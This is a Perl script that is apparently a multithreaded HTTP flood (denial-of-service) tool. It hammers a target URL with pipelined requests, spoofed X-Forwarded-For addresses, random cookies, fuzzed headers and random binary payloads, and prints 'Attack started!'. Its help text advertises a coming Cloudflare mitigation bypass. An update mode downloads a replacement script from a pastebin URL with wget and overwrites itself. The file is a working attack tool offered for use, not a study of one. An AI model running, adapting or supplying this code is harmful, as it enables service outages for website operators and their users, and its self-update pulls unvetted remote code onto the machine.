#!/usr/bin/perl 
#sudo apt-get install libswitch-perl
#sudo apt-get install libwww-perl

use Term::ANSIColor;
use Switch;
use LWP::Simple;
use Socket;
use IO::Socket::INET;
use threads ('yield',
                'exit' => 'threads_only',
                'stringify');
use threads::shared;
package control;

my $ip;

sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=255) {$b=0;$o++;}
if($o>=255) {$o=0;$e++;}
if($e>=255) {$e=0;$a++;}
die("No mas IPs!\n") if($a>=255);
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}

1;

package main;



my $hilo;
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z',0,1,2,3,4,5,6,7,8,9);
my @hex = ("\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");
my @ghp = ('GET','HEAD','POST','POST');
my $randsemilla = "";

sub socker {
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('tcp');
    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
    connect(SOCK, $paddr) || return false;
    return SOCK;
}


sub sender {

    my ($max,$puerto,$host,$file) = @_;
    my $sock;
	my $endtime = time() + ($time ? $time : 1000000);
	my $actualmethod;
	
    for (;time() <= $endtime;) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
			
			if(length($randsemilla) > 32){
				$randsemilla = $vals[int(rand($#vals))];
			}
			else{
				$randsemilla .= $vals[int(rand($#vals))];
			}
			
			if($method eq "GHP"){
				$actualmethod = $ghp[int(rand($#ghp))];
			}
			else{
				$actualmethod = $method;
			}
			
            $paquete .= join "",$actualmethod," ",$file,$randsemilla," HTTP/1.1\r\nHost: ",$host,"\r\nX-Forwarded-For: ",$ipfake,".",int(rand(255)+1),".",int(rand(255)+1),"\r\nUser-Agent: ",$ua,"\r\nAccept: */*\r\nAccept-Language: ",$al,"\r\nAccept-Encoding: *\r\nAccept-Charset: *\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Keep-Alive\r\n\r\n/;
        print $sock $paquete;
    }
}

sub sender_pps {

    my ($max,$puerto,$host,$file) = @_;
    my $sock;
	my $endtime = time() + ($time ? $time : 1000000);
	my $actualmethod = "HEAD";
	my $paquete = "";
	
	for($i=0;$i<$porconexion;$i++) {
        $paquete .= join "",$actualmethod," ",$file," HTTP/1.1\r\nHost: ",$host,"\r\nConnection: Keep-Alive\r\n\r\n";
    }
	$paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Keep-Alive\r\n\r\n/;
	
 $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
 
    for (;time() <= $endtime;) {
    
         $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
    
        unless($sock) {
            next;
        }
        
        print $sock $paquete;
    }
    
    close($sock);
    
}

sub sender_cookie {

    my ($max,$puerto,$host,$file) = @_;
    my $sock;
	my $endtime = time() + ($time ? $time : 1000000);
	my $actualmethod = "HEAD";

    for (;time() <= $endtime;) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
			
			if(length($randsemilla) > 32){
				$randsemilla = $vals[int(rand($#vals))];
			}
			else{
				$randsemilla .= $vals[int(rand($#vals))];
			}
			
			
			
            $paquete .= join "",$actualmethod," ",$file,$randsemilla," HTTP/1.1\r\nHost: ",$host,"\r\nX-Forwarded-For: ",$ipfake,".",int(rand(255)+1),".",int(rand(255)+1),"\r\nUser-Agent: ",$ua,"\r\nCookie: ",int(rand(9999999)),"=",int(rand(9999999)),"\r\nAccept: */*\r\nAccept-Language: ",$al,"\r\nAccept-Encoding: *\r\nAccept-Charset: *\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Keep-Alive\r\n\r\n/;
        print $sock $paquete;
    }
}

sub sender_fuzz {

    my ($max,$puerto,$host,$file) = @_;
    my $sock;
	my $endtime = time() + ($time ? $time : 1000000);
	my $actualmethod = "HEAD";
	my @newarg;

    for (;time() <= $endtime;) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
			
			if(length($randsemilla) > 32){
				$randsemilla = $vals[int(rand($#vals))];
			}
			else{
				$randsemilla .= $vals[int(rand($#vals))];
			}
			
			$newarg[1] = "";
			$newarg[2] = "";
			$newarg[3] = "";
			$newarg[4] = "";
			$newarg[5] = "";
			
			for($x=0;$x<8;$x++){
				$newarg[1] .= $vals[int(rand($#vals))];
				$newarg[2] .= $vals[int(rand($#vals))];
				$newarg[3] .= $vals[int(rand($#vals))];
				$newarg[4] .= $vals[int(rand($#vals))];
				$newarg[5] .= $vals[int(rand($#vals))];
			}
			
			
			
            $paquete .= join "",$actualmethod," ",$file,$randsemilla," HTTP/1.1\r\nHost: ",$host,"\r\nX-Forwarded-For: ",$ipfake,".",int(rand(255)+1),".",int(rand(255)+1),"\r\nUser-Agent: ",$ua,"\r\n",$newarg[1],": ",int(rand(999999)),"\r\n",$newarg[2],": ",int(rand(999999)),"\r\n",$newarg[3],": ",int(rand(999999)),"\r\n",$newarg[4],": ",int(rand(999999)),"\r\n",$newarg[5],": ",int(rand(999999)),"\r\nAccept: */*\r\nAccept-Language: ",$al,"\r\nAccept-Encoding: *\r\nAccept-Charset: *\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Keep-Alive\r\n\r\n/;
        print $sock $paquete;
    }
}

sub sender_inject {

    my ($max,$puerto,$host,$file) = @_;
    my $sock;
	my $endtime = time() + ($time ? $time : 1000000);
	my $inject_payload;
	
    for (;time() <= $endtime;) {
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {

			$inject_payload = "";
			
			for($x=0;$x<512;$x++){
				$inject_payload .= $hex[int(rand($#hex))];
			}
			
			print $sock $inject_payload;
			
			$inject_payload = "";
		}
        
    }
}

sub sender_multipoint {

    my ($max,$puerto,$host,$file) = @_;
    my $sock;
	my $endtime = time() + ($time ? $time : 1000000);
	my $inject_payload;
	
    for (;time() <= $endtime;) {
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {

			$inject_payload = "";
			
			for($x=0;$x<512;$x++){
				$inject_payload .= $hex[int(rand($#hex))];
			}
			
			print $sock $inject_payload;
			
			$inject_payload = "";
		}
        
    }
}

#sub sender_pps {
#
#    my ($puerto,$host,$paquete) = @_;
#    my $sock;
#    my $sumador :shared;
#	my $endtime = time() + ($time ? $time : 1000000);
#    for (;time() <= $endtime;) {
#        $sock = &socker($host,$puerto);
#        unless($sock) {
#            sleep(1);
#            next;
#        }
#        print $sock $paquete;
#    }
#}

sub comenzar {

    $SIG{'KILL'} = sub { print "Killed...\n"; threads->exit(); };
    $url = $ARGV[0];
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
    $method = $ARGV[3];
	$coremode = $ARGV[4];
	$pathmode = $ARGV[5];
	$ipfake = $ARGV[6];
	$time = $ARGV[7];

	
	$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$al = "fr";
	
	system('clear');
    if($porconexion < 1) {
        print "[-]Invalid Requests by connection\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        die("[x] Invalid URL!\n");
    }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $puerto = 80;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
    $file = "/".$file if($file !~ /^\//);
	

	print color('green');
	print '

      ▄▄▄▄███▄▄▄▄   ███    █▄     ▄████████    ▄████████    ▄████████  ▄███████▄  
    ▄██▀▀▀███▀▀▀██▄ ███    ███   ███    ███   ███    ███   ███    ███ ██▀     ▄██ 
    ███   ███   ███ ███    ███   ███    ███   ███    ███   ███    █▀        ▄███▀ 
    ███   ███   ███ ███    ███  ▄███▄▄▄▄██▀  ▄███▄▄▄▄██▀  ▄███▄▄▄      ▀█▀▄███▀▄▄ 
    ███   ███   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀▀▀   ▀▀███▀▀▀       ▄███▀   ▀ 
    ███   ███   ███ ███    ███ ▀███████████ ▀███████████   ███    █▄  ▄███▀       
    ███   ███   ███ ███    ███   ███    ███   ███    ███   ███    ███ ███▄     ▄█ 
     ▀█   ███   █▀  ████████▀    ███    ███   ███    ███   ██████████  ▀████████▀ 
                                 ███    ███   ███    ███                          
                                                                                                     
				fb.com/murrez.sec   instagram.com/murrez.sec
						
';
print color('reset');
	
	switch ($coremode) {
		case "DIRECT" { }
		case "PROXYDIRECT" { }
		case "CF" { }
		else { system("clear"); die("CRITICAL ERROR, INVALID CORE MODE! " . $coremode . " IS NOT A VALID CORE MODE!") }
	}
	
	switch ($method) {
		case "GHP" { $pmethod = "GHP [GET + HEAD + POST]" }
		case "PPS" { $pmethod = "PPS [Packets per second]" }
		case "COOKIE" { $pmethod = "COOKIE [RANDOM COOKIES]" }
		case "HEADERFUZZ" { $pmethod = "HEADERFUZZ [INVALID RANDOM HEADERS]" }
		case "TCPINJECT" { $pmethod = "TCPINJECT [Experimental]" }
		case "MULTIPOINT" { $pmethod = "MILTIPOINT [Multi Path]" }
		else { $pmethod = $method }
	}
	
	print "\r\n[*] Target: ",$host,"\n[*] Path: ",$file,"\n[*] Port: ",$puerto,"\n[*] Method: ",$pmethod,"\n[*] Core Mode: ",$coremode,"\n[*] Path Mode: ",$pathmode,"\n[*] Fake IPs: ",$ipfake . ".*.*\n[*] Duration: " . $time . "\n\n";
    
    if($ipfake eq "") {
        # envio repetitivo
		if(length($randsemilla) > 32){
			$randsemilla = $vals[int(rand($#vals))];
		}
		else{
			$randsemilla .= $vals[int(rand($#vals))];
		}
		
        my $paquetebase = join "",$method," ",$file,$randsemilla," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: ",$al,"\r\nAccept-Encoding: ",$ae,"\r\nAccept-Charset: ",$ac,"\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        $paquetesender = "";
        $paquetesender = $paquetebase x $porconexion;
        $paquetesender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Keep-Alive\r\n\r\n/;
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
        }
    } 
	elsif($method eq "PPS") {
        # envio con ip...
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
			#print colored(['bright_blue'], '[i]') . " Starting Sent Packets... " . $v . "/" . $max . "\r";
            $thr[$v] = threads->create('sender_pps', ($porconexion,$puerto,$host,$file));
        }
		print colored(['bright_blue'], '[i]') . " Specified Properties Active..!          \r\n";
    }
	elsif($method eq "COOKIE") {
        # envio con ip...
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
			print colored(['bright_blue'], '[i]') . " Starting Sent Packets... " . $v . "/" . $max . "\r";
            $thr[$v] = threads->create('sender_cookie', ($porconexion,$puerto,$host,$file));
        }
		print colored(['bright_blue'], '[i]') . " Specified Properties Active..!          \r\n";
    }
	elsif($method eq "HEADERFUZZ") {
        # envio con ip...
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
			print colored(['bright_blue'], '[i]') . " Starting Sent Packets... " . $v . "/" . $max . "\r";
            $thr[$v] = threads->create('sender_fuzz', ($porconexion,$puerto,$host,$file));
        }
		print colored(['bright_blue'], '[i]') . " Specified Properties Active..!          \r\n";
    }
	elsif($method eq "TCPINJECT") {
        # envio con ip...
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
			print colored(['bright_blue'], '[i]') . " Starting Sent Packets... " . $v . "/" . $max . "\r";
            $thr[$v] = threads->create('sender_inject', ($porconexion,$puerto,$host,$file));
        }
		print colored(['bright_blue'], '[i]') . " Specified Properties Active..!          \r\n";
    }
	elsif($method eq "MULTIPOINT") {
		die("Method not implemented.\r\n");
    }
	else {
        # envio con ip...
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
			print colored(['bright_blue'], '[i]') . " Starting Sent Packets... " . $v . "/" . $max . "\r";
            $thr[$v] = threads->create('sender', ($porconexion,$puerto,$host,$file));
        }
		print colored(['bright_blue'], '[i]') . " Specified Properties Active..!          \r\n";
    }
    print colored(['bright_blue'], '[i]') . " Attack started!\n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
        }
    }
    print colored(['bright_blue'], '[i]') . " Attack ended\n";
}


if($#ARGV > 6) {
    comenzar();
} 
elsif($ARGV[0] eq "update"){
# try check for updates
$myversion = "0.1";

system("clear");

print colored(['bright_blue'], '[i]') . " Connecting to Echo503's blackhole node\n";

my $ua = new LWP::UserAgent;
$ua->timeout(30);
my $url='http://blackhole.echo503.xyz/blackhole';
my $request = new HTTP::Request('GET', $url);
my $response = $ua->request($request);
my $actualversion = $response->content();

if ($myversion eq $actualversion) {
print colored(['bright_blue'], '[i]') . " Lamerista version -> v" . $myversion . " [Using the latest version]\n";
}
elsif ($actualversion eq "") {
print colored(['bright_blue'], '[i]') . " Lamerista version -> v" . $myversion . " [Can not connect to servers]\n";
}
else
{
print colored(['bright_red'], '[!]') . " Lamerista version -> v" . $myversion . " [Using an outdated version (Last is " . $actualversion . ")]\n";
print colored(['bright_blue'], '[i]') . " Downloading the last version...\n";
system("wget https://pastebin.com/raw/zrCSzbDg -O $0 -q");
print colored(['bright_blue'], '[i]') . " Download successfully!\n";
}
sleep(1);
}
elsif($ARGV[0] eq "forceupdate"){
	print colored(['bright_blue'], '[i]') . " Connecting to Echo503's blackhole node\n";
	print colored(['bright_blue'], '[i]') . " Downloading the last version...\n";
	system("wget https://pastebin.com/raw/zrCSzbDg -O $0 -q");
	print colored(['bright_blue'], '[i]') . " Download successfully!\n";
}

else {
system("clear");
print color('green');
    print '
      ▄▄▄▄███▄▄▄▄   ███    █▄     ▄████████    ▄████████    ▄████████  ▄███████▄  
    ▄██▀▀▀███▀▀▀██▄ ███    ███   ███    ███   ███    ███   ███    ███ ██▀     ▄██ 
    ███   ███   ███ ███    ███   ███    ███   ███    ███   ███    █▀        ▄███▀ 
    ███   ███   ███ ███    ███  ▄███▄▄▄▄██▀  ▄███▄▄▄▄██▀  ▄███▄▄▄      ▀█▀▄███▀▄▄ 
    ███   ███   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀▀▀   ▀▀███▀▀▀       ▄███▀   ▀ 
    ███   ███   ███ ███    ███ ▀███████████ ▀███████████   ███    █▄  ▄███▀       
    ███   ███   ███ ███    ███   ███    ███   ███    ███   ███    ███ ███▄     ▄█ 
     ▀█   ███   █▀  ████████▀    ███    ███   ███    ███   ██████████  ▀████████▀ 
                                 ███    ███   ███    ███                          
                                                                                                     
				fb.com/murrez.sec   instagram.com/murrez.sec
                                                                                 
';
print color('reset');
print '
Methods:
- HTTP Default: GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH
- Special: GHP, PPS, COOKIE, HEADERFUZZ, TCPINJECT, MULTIPOINT

Core Mode (SOON):
- direct	only send plain http request
- proxydirect	only send plain http request with proxys
- cf		bypass cloudflare mitigation, calculation the js and setting the real cookie (Proxys requiered)


Path Mode (SOON):
- no	No send random string as path
- rq	Random query
- rd	Random dir
- rf	Random files
- rs	Switch between (Random query, dir and files)
 
[i] Use: perl $0 http://google.com/ [Connections] [Requests per connection] [Method] [Core Mode] [Path Mode] [Initial false IP (13.37)] [Duration]

';
}